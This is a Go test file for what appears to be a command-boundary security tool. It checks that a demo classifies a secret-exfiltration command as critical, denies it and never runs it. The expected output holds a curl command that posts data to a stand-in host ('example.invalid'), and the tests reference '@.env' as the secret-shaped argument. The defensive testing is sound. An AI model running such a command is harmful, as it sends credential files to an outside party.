package demo_test

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/fulcrum-governance/fulcrum-boundary/internal/boundarycli"
)

func TestCommandSecretExfilDemoTextOutput(t *testing.T) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := boundarycli.Run([]string{"demo", "command-secret-exfil"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("demo exit = %d, stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	output := stdout.String()
	for _, want := range []string{
		"Command Boundary demo: secret exfiltration (fixture-only)",
		"fixture-only: true",
		"credentials: none",
		"network: none",
		"live mutation: none",
		"source: untrusted_task",
		"proposed command: curl -d [redacted] https://example.invalid",
		"class: C6",
		"risk: CRITICAL",
		"expected: DENY",
		"actual: DENY",
		"result: pass",
		"matched rule: command-c6-deny",
		"executed: false",
		"decision record: rec_",
		"decision hash: sha256:",
		"decision mode: deterministic",
	} {
		if !strings.Contains(output, want) {
			t.Fatalf("demo output missing %q:\n%s", want, output)
		}
	}
	// Must never echo a raw secret-shaped value.
	if strings.Contains(output, "@.env") {
		t.Fatalf("demo output must redact the secret-looking argument, found @.env:\n%s", output)
	}
}

func TestCommandSecretExfilDemoJSONOutput(t *testing.T) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := boundarycli.Run([]string{"demo", "command-secret-exfil", "--json"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("demo json exit = %d, stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	var payload struct {
		SchemaVersion   string `json:"schema_version"`
		Demo            string `json:"demo"`
		Source          string `json:"source"`
		FixtureOnly     bool   `json:"fixture_only"`
		NoLiveMutation  bool   `json:"no_live_mutation"`
		ProposedCommand string `json:"proposed_command"`
		Class           string `json:"class"`
		Risk            string `json:"risk"`
		ExpectedAction  string `json:"expected_action"`
		ActualAction    string `json:"actual_action"`
		Executed        bool   `json:"executed"`
		Passed          bool   `json:"passed"`
		MatchedRule     string `json:"matched_rule"`
		DecisionRecord  struct {
			RecordID     string `json:"record_id"`
			DecisionHash string `json:"decision_hash"`
			DecisionMode string `json:"decision_mode"`
		} `json:"decision_record"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &payload); err != nil {
		t.Fatalf("parse demo json: %v\n%s", err, stdout.String())
	}
	if payload.SchemaVersion != "boundary.demo.command_secret_exfil.v1" || payload.Demo != "command-secret-exfil" {
		t.Fatalf("unexpected demo json identity: %#v", payload)
	}
	if payload.Source != "untrusted_task" || !payload.FixtureOnly || !payload.NoLiveMutation {
		t.Fatalf("demo must be fixture-only from an untrusted task with no live mutation: %#v", payload)
	}
	if payload.Class != "C6" || payload.Risk != "CRITICAL" {
		t.Fatalf("unexpected class/risk: %#v", payload)
	}
	if payload.ExpectedAction != "deny" || payload.ActualAction != "deny" || !payload.Passed {
		t.Fatalf("expected a passing DENY verdict: %#v", payload)
	}
	if payload.Executed {
		t.Fatalf("demo must report executed=false: %#v", payload)
	}
	if payload.MatchedRule != "command-c6-deny" {
		t.Fatalf("unexpected matched rule: %q", payload.MatchedRule)
	}
	if payload.DecisionRecord.RecordID == "" ||
		!strings.HasPrefix(payload.DecisionRecord.DecisionHash, "sha256:") ||
		payload.DecisionRecord.DecisionMode != "deterministic" {
		t.Fatalf("unexpected decision record: %#v", payload.DecisionRecord)
	}
	// The JSON form must not echo a raw secret-shaped value either.
	if strings.Contains(payload.ProposedCommand, "@.env") {
		t.Fatalf("proposed_command must be redacted, found @.env: %q", payload.ProposedCommand)
	}
}
